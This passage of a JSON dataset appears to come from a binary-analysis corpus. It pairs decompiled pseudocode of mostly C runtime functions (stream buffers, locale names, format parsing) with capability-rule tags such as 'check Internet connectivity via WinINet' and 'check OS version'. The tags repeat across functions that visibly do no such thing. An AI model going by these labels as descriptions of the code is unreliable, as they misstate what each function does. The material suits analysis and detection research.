piVar6 = fcn.00405e07();\n                return piVar6;\n            }\n        }\n    }\n    else {\n        uStack40 = 0;\n    }\ncode_r0x004185a9:\n    param_1 = piStack36;\n    cVar3 = fcn.00402108();\n    if (cVar3 == '\\0') {\n        uStack20 = 2;\n        fcn.00405443();\n        param_1 = piStack36;\n    }\n    piVar6 = *(param_1 + *(*param_1 + 4) + 0x38);\n    if (piVar6 != NULL) {\n        uStack20 = 1;\n        (**(*piVar6 + 8))();\n        param_1 = piStack36;\n    }\ncode_r0x004185e1:\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 948
    },
    "00403058": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t * fcn.00403058(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t **ppiVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int16_t **ppiVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    fcn.004057e5(0);\n    iVar10 = 7;\n    ppiVar3 = *(var_18h + 0x9c) + 0xd0;\n    ppiVar8 = ppiVar3;\n    do {\n        piVar6 = ppiVar8[-7];\n        piVar4 = piVar6 + 1;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        piVar5 = *ppiVar8;\n        piVar9 = piVar5 + 1;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n        } while (iVar1 != 0);\n        ppiVar8 = ppiVar8 + 1;\n        iVar7 = iVar7 + 2 + (piVar5 - piVar9 >> 1) + (piVar6 - piVar4 >> 1);\n        iVar10 = iVar10 + -1;\n    } while (iVar10 != 0);\n    piVar4 = fcn.00403ff3(iVar7 * 2 + 2);\n    if (piVar4 == NULL) {\n        piVar4 = NULL;\n    }\n    else {\n        var_ch = 0;\n        piVar6 = piVar4;\n        do {\n            *piVar6 = 0x3a;\n            piVar9 = piVar6 + 1;\n            iVar10 = fcn.004038dc(piVar9, (iVar7 - (piVar9 - piVar4 >> 1)) + 1, ppiVar3[-7]);\n            if (iVar10 != 0) {\ncode_r0x004bc2c7:\n                fcn.004035f8(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                piVar4 = (*pcVar2)();\n                return piVar4;\n            }\n            piVar5 = piVar9;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            piVar9 = piVar9 + (piVar5 - (piVar6 + 2) >> 1);\n            *piVar9 = 0x3a;\n            piVar6 = piVar9 + 1;\n            iVar10 = fcn.004038dc(piVar6, (iVar7 - (piVar6 - piVar4 >> 1)) + 1, *ppiVar3);\n            if (iVar10 != 0) goto code_r0x004bc2c7;\n            piVar5 = piVar6;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            ppiVar3 = ppiVar3 + 1;\n            piVar6 = piVar6 + (piVar5 - (piVar9 + 2) >> 1);\n            var_ch = var_ch + 1;\n        } while (var_ch < 7);\n        *piVar6 = 0;\n    }\n    fcn.00406302(0);\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    return piVar4;\n}\n",
        "token_count": 925
    },
    "004030da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort __fastcall fcn.004030da(int32_t *param_1)\n\n{\n    code *pcVar1;\n    ushort uVar2;\n    \n    if ((*param_1[7] != NULL) && (0 < *param_1[0xb])) {\n        return **param_1[7];\n    }\n    pcVar1 = *(*param_1 + 0x18);\n    (**0x573000)();\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 108
    },
    "004030df": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.004030df(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint noname_0;\n    uint arg_10h_00;\n    uint arg_14h_00;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t arg_18h_00;\n    int32_t unaff_EBP;\n    char *pcVar10;\n    int32_t iVar11;\n    uint32_t arg_1ch_00;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0x50);\n    uVar8 = *(unaff_EBP + 0x24);\n    iVar2 = *(unaff_EBP + 0x18);\n    pcVar10 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x58) = iVar2;\n    *(unaff_EBP + -0x44) = pcVar10;\n    if ((uVar8 == 0) || ((*pcVar10 != '+' && (*pcVar10 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if (((((*(iVar2 + 0x14) & 0xe00) == 0x800) && (arg_1ch_00 + 2 <= uVar8)) && (pcVar10[arg_1ch_00] == '0')) &&\n       ((pcVar10[arg_1ch_00 + 1] == 'x' || (pcVar10[arg_1ch_00 + 1] == 'X')))) {\n        arg_1ch_00 = arg_1ch_00 + 2;\n    }\n    fcn.0040327e(*(iVar2 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.0040342c(unaff_EBP + -0x50);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x48) = uVar5;\n    fcn.004050a6();\n    fcn.00405510(uVar8, 0);\n    iVar11 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar11 = *(unaff_EBP + -0x28);\n    }\n    fcn.00402bdf(*(unaff_EBP + -0x44), uVar8 + *(unaff_EBP + -0x44), iVar11);\n    fcn.0040327e(*(iVar2 + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.004053a8(unaff_EBP + -0x50);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar6;\n    fcn.004050a6();\n    pcVar3 = *(*piVar6 + 0x14);\n    (**0x573000)(unaff_EBP + -0x40);\n    (*pcVar3)();\n    pcVar10 = unaff_EBP + -0x40;\n    *(unaff_EBP + -4) = 3;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar10 = *(unaff_EBP + -0x40);\n    }\n    if ((*pcVar10 != '\\x7f') && ('\\0' < *pcVar10)) {\n        uVar7 = fcn.004017d0();\n        uVar7 = uVar7 & 0xffff;\n        *(unaff_EBP + -0x48) = uVar7;\n        while (((cVar1 = *pcVar10,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar8 - arg_1ch_00))) {\n            uVar8 = uVar8 - cVar1;\n            fcn.0040594d(uVar8, 1, uVar7);\n            if ('\\0' < pcVar10[1]) {\n                pcVar10 = pcVar10 + 1;\n            }\n            uVar7 = *(unaff_EBP + -0x48);\n        }\n    }\n    iVar2 = *(unaff_EBP + -0x58);\n    uVar8 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x48) = uVar8;\n    if (((*(iVar2 + 0x24) < 0) || ((*(iVar2 + 0x24) < 1 && (*(iVar2 + 0x20) == 0)))) || (*(iVar2 + 0x20) <= uVar8)) {\n        iVar11 = 0;\n    }\n    else {\n        iVar11 = *(iVar2 + 0x20) - uVar8;\n    }\n    uVar8 = *(iVar2 + 0x14) & 0x1c0;\n    if (uVar8 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar5 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar8 == 0x100) {\n            arg_18h_00 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                arg_18h_00 = *(unaff_EBP + -0x28);\n            }\n            puVar9 = fcn.00404e0d(*(unaff_EBP + 8), unaff_EBP + -0x50, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                                  arg_18h_00, arg_1ch_00);\n            uVar5 = *puVar9;\n            uVar4 = puVar9[1];\n            *(unaff_EBP + 0x14) = uVar4;\n            *(unaff_EBP + 0x10) = uVar5;\n            puVar9 = fcn.004014c9(*(unaff_EBP + 8), unaff_EBP + -0x50, uVar5, uVar4, *(unaff_EBP + 0x1c), iVar11);\n            iVar11 = 0;\n            goto code_r0x00473b66;\n        }\n        puVar9 = fcn.004014c9(*(unaff_EBP + 8), unaff_EBP + -0x50, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                              *(unaff_EBP + 0x1c), iVar11);\n        iVar11 = 0;\n        uVar5 = *puVar9;\n        var_2ch = puVar9[1];\n        var_28h = unaff_EBP + -0x28;\n        *(unaff_EBP + 0x10) = uVar5;\n        *(unaff_EBP + 0x14) = var_2ch;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n    }\n    puVar9 = fcn.00404e0d(*(unaff_EBP + 8), unaff_EBP + -0x50, uVar5, var_2ch, var_28h, arg_1ch_00);\ncode_r0x00473b66:\n    uVar5 = puVar9[1];\n    uVar4 = *puVar9;\n    *(unaff_EBP + 0x10) = uVar4;\n    *(unaff_EBP + 0x14) = uVar5;\n    *(unaff_EBP + -0x44) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x44) = *(unaff_EBP + -0x28);\n    }\n    noname_0 = *(unaff_EBP + 8);\n    puVar9 = fcn.00404e0d(noname_0, unaff_EBP + -0x5c, uVar4, uVar5, *(unaff_EBP + -0x44) + arg_1ch_00 * 2, \n                          *(unaff_EBP + -0x48) - arg_1ch_00);\n    uVar5 = *(unaff_EBP + 0x1c);\n    uVar4 = *(unaff_EBP + -0x54);\n    arg_10h_00 = *puVar9;\n    arg_14h_00 = puVar9[1];\n    *(iVar2 + 0x20) = 0;\n    *(iVar2 + 0x24) = 0;\n    *(unaff_EBP + 0x10) = arg_10h_00;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.004014c9(noname_0, uVar4, arg_10h_00, arg_14h_00, uVar5, iVar11);\n    fcn.004029b9();\n    fcn.00405ad3();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 2508
    },
    "00403111": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403111(code **param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4e2dac;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x56cca8 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    if (param_1[0x13] != NULL) {\n        fcn.004036cf(uVar1);\n    }\n    if (*(param_1 + 0x12) != '\\0') {\n        fcn.00405a24();\n    }\n    fcn.0040588f();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 215
    },
    "0040313e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040313e(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    char *pcVar1;\n    \n    if ((((*(in_ECX + 0x28) == '\\0') && (arg_ch < 3)) && (arg_10h < 2)) && (arg_14h < 5)) {\n        pcVar1 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                 + ((arg_10h + arg_ch * 2) * 5 + arg_14h) * 4;\n    }\n    else {\n        pcVar1 = \"$+xv\";\n    }\n    *arg_8h = *pcVar1;\n    return;\n}\n",
        "token_count": 248
    },
    "00403161": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00403161(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_14h = 0;\n    var_10h = 0;\n    fcn.00401f91(&var_ch, arg_8h, &var_14h, in_ECX + 0x18);\n    fcn.00403085(var_14h);\n    return;\n}\n",
        "token_count": 159
    },
    "004031b1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004031b1(int32_t *arg_8h, int32_t *arg_ch, uchar *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    uint arg_ch_00;\n    int32_t *piVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar3 = *0x56f458 + 1;\n    var_10h = 0;\n    iVar4 = *pcVar3;\n    var_8h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    if (iVar4 == 0x41) {\n        *0x56f458 = pcVar3;\n        if (arg_14h == 0) {\n            if ((*arg_ch == 2) || (*arg_ch == 3)) {\n                *arg_ch = 5;\n            }\n            else if (*arg_ch == 1) {\n                *arg_ch = 4;\n            }\n        }\ncode_r0x0048d6c5:\n        *0x56f458 = *0x56f458 + 1;\n        arg_8h[1] = 0;\n    }\n    else {\n        if (iVar4 == 0x42) {\n            if (arg_14h == 0) {\n                *0x56f458 = pcVar3;\n                *arg_10h = 1;\n                fcn.0040448a(0x3e);\n                goto code_r0x0048d6c5;\n            }\n        }\n        else {\n            if (iVar4 == 0x43) {\n                *0x56f458 = pcVar3;\n                *arg_ch = 5;\n                goto code_r0x0048d6c5;\n            }\n            if ((*pcVar3 == '\\0') || (pcVar1 = *0x56f458 + 2,  *pcVar1 == '\\0')) {\n                *0x56f458 = pcVar3;\n                fcn.004017df(1);\n                return arg_8h;\n            }\n            if (arg_14h == 0) {\n                *0x56f458 = *0x56f458 + 3;\n                arg_8h_00 = *pcVar1 + -0x30 + (iVar4 + -0x30) * 0x10;\n                if (1 < arg_8h_00) {\n                    fcn.0040448a(0x2c);\n                    arg_ch_00 = fcn.0040128a(arg_8h_00, 0);\n                    piVar2 = fcn.004052f9(&var_18h, arg_ch_00);\n                    var_10h = *piVar2;\n                    var_ch = piVar2[1];\n                }\n                fcn.00403cba(0x3e);\n                var_8h = var_10h;\n                var_4h = var_ch;\n                if (**0x56f458 == '$') {\n                    *0x56f458 = *0x56f458 + 1;\n                }\n                else {\n                    fcn.00403cba(0x5e);\n                }\n                if (**0x56f458 == '\\0') {\n                    if (var_ch < '\\x02') {\n                        var_8h = var_10h;\n                        var_4h = var_ch;\n                        if (var_10h == 0) {\n                            fcn.00402e8c(1);\n                            var_ch = var_4h;\n                            var_10h = var_8h;\n                        }\n                        else {\n                            fcn.0040564b(0x54fa08);\n                            var_ch = var_4h;\n                            var_10h = var_8h;\n                        }\n                    }\n                }\n                else {\n                    *0x56f458 = *0x56f458 + 1;\n                }\n                *arg_8h = var_10h;\n                arg_8h[1] = var_ch | 0x4000;\n                return arg_8h;\n            }\n        }\n        *0x56f458 = pcVar3;\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n    }\n    *arg_8h = 0;\n    return arg_8h;\n}\n",
        "token_count": 1019
    },
    "004612a9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004612a9(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    uVar1 = **(in_ECX + 0x1c);\n    if (((uVar1 != 0) && (**(in_ECX + 0xc) < uVar1)) && ((arg_8h == 0xffffffff || (*(uVar1 - 1) == arg_8h)))) {\n        **(in_ECX + 0x2c) = **(in_ECX + 0x2c) + 1;\n        **(in_ECX + 0x1c) = **(in_ECX + 0x1c) + -1;\n        return -(arg_8h != 0xffffffff) & arg_8h;\n    }\n    if ((*(in_ECX + 0x4c) != 0) && (arg_8h != 0xffffffff)) {\n        if ((*(in_ECX + 0x38) == 0) && (iVar2 = fcn.00403594(arg_8h & 0xff, *(in_ECX + 0x4c)),  iVar2 != -1)) {\n            return arg_8h;\n        }\n        if (**(in_ECX + 0x1c) != in_ECX + 0x3c) {\n            *(in_ECX + 0x3c) = arg_8h;\n            fcn.004016b8();\n            return arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 361
    },
    "00403215": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403215(int32_t param_1)\n\n{\n    if (*(param_1 + 0x14) != '\\0') {\n        fcn.00406302(*(param_1 + 8));\n        *(param_1 + 0x14) = 0;\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0040323d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040323d(char *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint *in_ECX;\n    \n    arg_ch = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        do {\n            arg_ch = arg_ch + 1;\n        } while (arg_8h[arg_ch] != '\\0');\n        if (arg_ch != 0) {\n            fcn.0040669a(arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "004615bb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004615bb(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint arg_10h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if ((arg_8h == 0) && ((arg_ch | arg_10h) == 0)) {\n        arg_10h_00 = 4;\n    }\n    else {\n        arg_10h_00 = 0;\n    }\n    if ((*(in_ECX + 0x4c) != 0) && (iVar1 = fcn.0040292d(*(in_ECX + 0x4c), arg_8h, arg_10h_00, arg_ch),  iVar1 == 0)) {\n        fcn.0040350d(*(in_ECX + 0x4c), 1);\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "00403279": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403279(int32_t arg_8h, uint32_t arg_ch, char *arg_10h)\n\n{\n    code *pcVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (arg_10h == NULL) {\n        fcn.0040255e(\"bad locale name\");\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    if ((*arg_10h != '*') || (arg_10h[1] != '\\0')) {\n        if (arg_ch == 0) {\n            arg_10h = NULL;\n        }\n        else if (arg_ch != 0x3f) {\n            iVar3 = 0;\n            do {\n                if ((arg_ch & (1 << (iVar3 & 0x1f)) >> 1) != 0) {\n                    fcn.00405e25(iVar3, arg_10h);\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 6);\n            iVar3 = fcn.00405e25(0, arg_10h);\n            goto code_r0x00465a4b;\n        }\n        iVar3 = fcn.00405e25(0, arg_10h);\n    }\ncode_r0x00465a4b:\n    if (iVar3 == 0) {\n        iVar3 = 0x54d840;\n    }\n    else {\n        pcVar2 = *(arg_8h + 0x2c);\n        if (pcVar2 == NULL) {\n            pcVar2 = arg_8h + 0x30;\n        }\n        if ((*pcVar2 == '*') && (pcVar2[1] == '\\0')) {\n            return arg_8h;\n        }\n    }\n    fcn.00404b6a(iVar3);\n    return arg_8h;\n}\n",
        "token_count": 436
    },
    "004032e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004032e2(ushort *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "004032f1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004032f1(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.004039a4();\n        *puVar6 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049ea95:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049ea99:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049ea9c:\n            cVar4 = fcn.00405880(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049ea41:\n                arg_8h = 0x10;\n                goto code_r0x0049ea9c;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049ea55;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049ea29;\n                }\n            }\ncode_r0x0049eaa5:\n            cVar4 = fcn.00403b11();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00404ead();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049eaa5;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049ea55:\n            cVar4 = fcn.004040e3(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004043f9();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049eaa5;\n            if (cVar4 == 'i') goto code_r0x0049ea95;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00402c9d();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.004015a0();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 